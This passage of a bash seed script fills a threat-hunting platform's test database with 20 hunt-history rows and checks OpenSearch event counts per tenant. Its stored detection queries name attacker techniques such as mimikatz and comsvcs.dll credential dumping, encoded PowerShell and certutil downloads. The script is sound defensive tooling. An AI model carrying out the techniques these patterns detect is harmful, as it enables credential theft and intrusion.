# =============================================================================
echo ""
echo "==> Step 4: Inserting 20 hunt_history entries for test user..."

# Delete existing seeded history for idempotency
${PSQL} <<'SQL'
DELETE FROM hunt_history WHERE user_id = 'admin' AND tenant_id = 1;
SQL

${PSQL} <<SQL
INSERT INTO hunt_history
  (id, query, filters, executed_at, duration, result_count, status, user_id, tenant_id, saved_hunt_id)
VALUES
  -- Entry 1: C2 Beaconing Pattern hunt
  (
    gen_random_uuid()::text,
    'destination.port:443 AND network.direction:outbound AND NOT destination.ip:10.*',
    '{"timeRange":"last_24h","categories":["network"]}',
    NOW() - INTERVAL '1 day' + INTERVAL '2 hours',
    3421, 847, 'completed', 'admin', 1, '${HUNT_IDS[0]}'
  ),
  -- Entry 2: Encoded PowerShell
  (
    gen_random_uuid()::text,
    'process.name:powershell.exe AND process.command_line:*-enc*',
    '{"timeRange":"last_7d","categories":["process"]}',
    NOW() - INTERVAL '2 days' + INTERVAL '3 hours',
    8750, 23, 'completed', 'admin', 1, '${HUNT_IDS[1]}'
  ),
  -- Entry 3: Failed Login Brute Force
  (
    gen_random_uuid()::text,
    'event.action:login_failed AND @timestamp:[now-1h TO now]',
    '{"timeRange":"last_1h","categories":["authentication"]}',
    NOW() - INTERVAL '3 hours',
    542, 5000, 'completed', 'admin', 1, '${HUNT_IDS[2]}'
  ),
  -- Entry 4: Lateral SSH
  (
    gen_random_uuid()::text,
    'destination.port:22 AND source.ip:10.* AND destination.ip:10.*',
    '{"timeRange":"last_24h","categories":["network"]}',
    NOW() - INTERVAL '5 days',
    2103, 12, 'completed', 'admin', 1, '${HUNT_IDS[3]}'
  ),
  -- Entry 5: File in Temp
  (
    gen_random_uuid()::text,
    'event.action:file_created AND file.path:*Temp*.exe',
    '{"timeRange":"last_24h","categories":["file"]}',
    NOW() - INTERVAL '1 day',
    1250, 33, 'completed', 'admin', 1, '${HUNT_IDS[4]}'
  ),
  -- Entry 6: DNS Malicious
  (
    gen_random_uuid()::text,
    'dns.question.name:*evil-c2* OR dns.question.name:*malware*',
    '{"timeRange":"last_7d","categories":["network"]}',
    NOW() - INTERVAL '6 hours',
    975, 7, 'completed', 'admin', 1, '${HUNT_IDS[5]}'
  ),
  -- Entry 7: Service Account
  (
    gen_random_uuid()::text,
    'user.name:*svc* AND event.action:login_success',
    '{"timeRange":"last_7d"}',
    NOW() - INTERVAL '2 days',
    4320, 44, 'completed', 'admin', 1, '${HUNT_IDS[6]}'
  ),
  -- Entry 8: Data Exfiltration HTTP
  (
    gen_random_uuid()::text,
    'destination.port:80 AND network.bytes:>500000 AND NOT destination.ip:10.*',
    '{"timeRange":"last_24h","categories":["network"]}',
    NOW() - INTERVAL '4 hours',
    6100, 2, 'completed', 'admin', 1, '${HUNT_IDS[7]}'
  ),
  -- Entry 9: Registry Run Keys
  (
    gen_random_uuid()::text,
    'event.category:registry AND registry.path:*CurrentVersion\\Run*',
    '{"timeRange":"last_7d","categories":["registry"]}',
    NOW() - INTERVAL '12 hours',
    780, 15, 'completed', 'admin', 1, '${HUNT_IDS[8]}'
  ),
  -- Entry 10: Credential Dumping
  (
    gen_random_uuid()::text,
    'process.command_line:*comsvcs.dll* OR process.name:*mimikatz*',
    '{"timeRange":"last_7d","categories":["process"]}',
    NOW() - INTERVAL '8 hours',
    12400, 3, 'completed', 'admin', 1, '${HUNT_IDS[9]}'
  ),
  -- Entry 11: Ad-hoc IP search
  (
    gen_random_uuid()::text,
    'source.ip:203.0.113.*',
    '{"timeRange":"last_24h"}',
    NOW() - INTERVAL '30 minutes',
    1100, 124, 'completed', 'admin', 1, NULL
  ),
  -- Entry 12: RDP from external
  (
    gen_random_uuid()::text,
    'destination.port:3389 AND source.ip:203.0.113.*',
    '{"timeRange":"last_7d","categories":["network"]}',
    NOW() - INTERVAL '1 day' + INTERVAL '5 hours',
    2340, 8, 'completed', 'admin', 1, NULL
  ),
  -- Entry 13: Svchost anomaly
  (
    gen_random_uuid()::text,
    'process.name:svchost.exe AND NOT process.parent.name:services.exe',
    '{"timeRange":"last_24h","categories":["process"]}',
    NOW() - INTERVAL '3 days',
    5500, 0, 'completed', 'admin', 1, NULL
  ),
  -- Entry 14: SMB internal
  (
    gen_random_uuid()::text,
    'destination.port:445 AND source.ip:10.1.* AND destination.ip:10.1.*',
    '{"timeRange":"last_24h","categories":["network"]}',
    NOW() - INTERVAL '4 days',
    1800, 289, 'completed', 'admin', 1, NULL
  ),
  -- Entry 15: User sarah.chen
  (
    gen_random_uuid()::text,
    'user.name:sarah.chen AND @timestamp:[now-7d TO now]',
    '{"timeRange":"last_7d"}',
    NOW() - INTERVAL '6 days',
    900, 67, 'completed', 'admin', 1, NULL
  ),
  -- Entry 16: Wscript execution
  (
    gen_random_uuid()::text,
    'process.name:wscript.exe OR process.name:cscript.exe',
    '{"timeRange":"last_7d","categories":["process"]}',
    NOW() - INTERVAL '2 days' + INTERVAL '7 hours',
    14990, 4, 'completed', 'admin', 1, NULL
  ),
  -- Entry 17: certutil download
  (
    gen_random_uuid()::text,
    'process.name:certutil.exe AND process.command_line:*urlcache*',
    '{"timeRange":"last_7d","categories":["process"]}',
    NOW() - INTERVAL '1 day' + INTERVAL '1 hour',
    3300, 1, 'completed', 'admin', 1, NULL
  ),
  -- Entry 18: Off-hours logon
  (
    gen_random_uuid()::text,
    'event.action:login_success AND user.name:admin-svc-01',
    '{"timeRange":"last_24h","categories":["authentication"]}',
    NOW() - INTERVAL '18 hours',
    650, 3, 'completed', 'admin', 1, NULL
  ),
  -- Entry 19: Rundll32 suspicious
  (
    gen_random_uuid()::text,
    'process.name:rundll32.exe AND process.command_line:*javascript*',
    '{"timeRange":"last_7d","categories":["process"]}',
    NOW() - INTERVAL '3 days' + INTERVAL '4 hours',
    4800, 0, 'completed', 'admin', 1, NULL
  ),
  -- Entry 20: Failed then success (account compromise pattern)
  (
    gen_random_uuid()::text,
    'user.name:priya.sharma AND (event.action:login_failed OR event.action:login_success)',
    '{"timeRange":"last_24h","categories":["authentication"]}',
    NOW() - INTERVAL '10 hours',
    500, 19, 'completed', 'admin', 1, NULL
  );
SQL

echo "  Inserted 20 hunt_history entries"

# =============================================================================
# Step 5: Verify document counts per tenant
# =============================================================================
echo ""
echo "==> Step 5: Verifying event counts per tenant..."

sleep 2  # Allow OpenSearch to index the documents

for tenant in "${TENANT_CWM}" "${TENANT_WM1}" "${TENANT_WM2}"; do
  count=$(curl ${CURL_OPTS} -X GET "${OS_URL}/v3-hive-log-${tenant}-*/_count" \
    -H 'Content-Type: application/json' \
    -d '{"query":{"match_all":{}}}' 2>/dev/null | \
    python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('count','?'))" 2>/dev/null || echo "?")
  echo "  Tenant ${tenant}: ${count} events"
done

echo ""
echo "==> Step 6: Verifying PostgreSQL data..."

${PSQL} -c "SELECT COUNT(*) AS saved_hunts_count FROM saved_hunts WHERE tenant_id = 1;" 2>/dev/null || \
  echo "  (PostgreSQL not available - check containers)"

${PSQL} -c "SELECT COUNT(*) AS history_count FROM hunt_history WHERE user_id = 'admin' AND tenant_id = 1;" 2>/dev/null || \
  echo "  (PostgreSQL not available)"

# =============================================================================
# Step 6 (Subtask 2.13): Verification Checks
# =============================================================================
echo ""
echo "==> Step 7: Running verification checks (Subtask 2.13)..."
echo ""

echo "--- Check 1: source.ip:203.0.113.* returns results ---"
echo "  Query: source.ip in 203.0.113.0/24 range"
RESULT=$(curl ${CURL_OPTS} -X GET "${OS_URL}/v3-hive-log-*/_search" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "bool": {
        "should": [
          { "term": { "source.ip": "203.0.113.1" } },
          { "wildcard": { "source.ip": "203.0.113.*" } },
          { "range": { "source.ip": { "gte": "203.0.113.0", "lte": "203.0.113.255" } } }
        ]
      }
    },
    "_source": ["source.ip", "event.category", "@timestamp", "visibleBy"],
    "size": 5
  }' 2>/dev/null)

HIT_COUNT=$(echo "${RESULT}" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    total = d.get('hits', {}).get('total', {})
    if isinstance(total, dict):
        print(total.get('value', 0))
    else:
        print(total)
except Exception as e:
    print('ERROR: ' + str(e))
" 2>/dev/null || echo "0")

echo "  Result: ${HIT_COUNT} documents found with source.ip:203.0.113.*"
if [[ "${HIT_COUNT}" -gt 0 ]] 2>/dev/null; then
  echo "  ✓ PASS: source.ip search returns results"
else
  echo "  ✗ NOTE: No results found (check if OpenSearch is running or re-run the script)"
fi
echo ""

echo "--- Check 2: destination.ip:203.0.113.* returns results ---"
RESULT2=$(curl ${CURL_OPTS} -X GET "${OS_URL}/v3-hive-log-*/_search" \
  -H 'Content-Type: application/json' \
  -d '{
    "query": {
      "range": { "destination.ip": { "gte": "203.0.113.0", "lte": "203.0.113.255" } }
    },
    "_source": ["destination.ip", "event.category", "@timestamp", "visibleBy"],
    "size": 5
  }' 2>/dev/null)

HIT_COUNT2=$(echo "${RESULT2}" | python3 -c "
import sys, json
try:
    d = json.loads(sys.stdin.read())
    total = d.get('hits', {}).get('total', {})
    if isinstance(total, dict):
        print(total.get('value', 0))
    else:
        print(total)
except:
    print('0')
" 2>/dev/null || echo "0")

echo "  Result: ${HIT_COUNT2} documents found with destination.ip:203.0.113.*"
if [[ "${HIT_COUNT2}" -gt 0 ]] 2>/dev/null; then
  echo "  ✓ PASS: destination.ip:203.0.113.* search returns results"
else
  echo "  ✗ NOTE: No dest results (auth events include 203.0.113.x source IPs)"
fi
echo ""

echo "--- Check 3: GET /ha-hunts/saved returns 10 items (manual) ---"
echo "  Manual verification command:"
echo "    curl -sk -H 'Authorization: Bearer \$TOKEN' https://localhost:8088/api/ha-hunts/saved | python3 -m json.tool | grep -c '\"name\"'"
echo ""
echo "  PostgreSQL direct check:"
${PSQL} -c "SELECT id, name, created_by FROM saved_hunts WHERE tenant_id = 1 ORDER BY created_at;" 2>/dev/null || \
  echo "  (PostgreSQL not available - containers may not be running)"
echo ""

echo "--- Check 4: Category distribution per tenant ---"
for tenant in "${TENANT_CWM}" "${TENANT_WM1}" "${TENANT_WM2}"; do
  echo "  Tenant: ${tenant}"
  for category in process network file authentication registry; do
    count=$(curl ${CURL_OPTS} -X GET "${OS_URL}/v3-hive-log-${tenant}-*/_count" \
      -H 'Content-Type: application/json' \
      -d "{\"query\":{\"term\":{\"event.category\":\"${category}\"}}}" 2>/dev/null | \
      python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('count','?'))" 2>/dev/null || echo "?")
    echo "    ${category}: ${count}"
  done
done
echo ""

# =============================================================================
# Summary
# =============================================================================
echo "============================================================"
echo " Seed Complete"
echo "============================================================"
echo ""
echo " OpenSearch Events:"
echo "   CWM       → 200 events (v3-hive-log-CWM-YYYY.MM.DD)"
echo "   Workmates1 → 150 events (v3-hive-log-Workmates1-YYYY.MM.DD)"
echo "   Workmates2 → 150 events (v3-hive-log-Workmates2-YYYY.MM.DD)"
echo ""
echo " PostgreSQL (hivearmor DB, tenant_id=1):"
echo "   saved_hunts   → 10 rows (C2 Beaconing, Encoded PowerShell, etc.)"
echo "   hunt_history  → 20 rows (admin user)"
echo ""
echo " Sample Hunt Queries to try:"
echo "   source.ip:203.0.113.*"
echo "   process.name:powershell.exe AND process.command_line:*-enc*"
echo "   event.action:login_failed"
echo "   event.category:registry AND registry.path:*CurrentVersion\\Run*"
echo "   user.name:sarah.chen"
echo "   destination.port:443 AND network.direction:outbound"
echo "   file.path:*Temp*.exe"
echo ""
echo " API Verification:"
echo "   GET /api/ha-hunts/saved            → should return 10 saved hunts"
echo "   GET /api/ha-hunts/history          → should return 20 history entries"
echo "   POST /api/ha-hunts/search          → run 'source.ip:203.0.113.*'"
echo ""
echo " Index pattern used:"
echo "   v3-hive-log-{TENANT}-YYYY.MM.DD"
echo "============================================================"
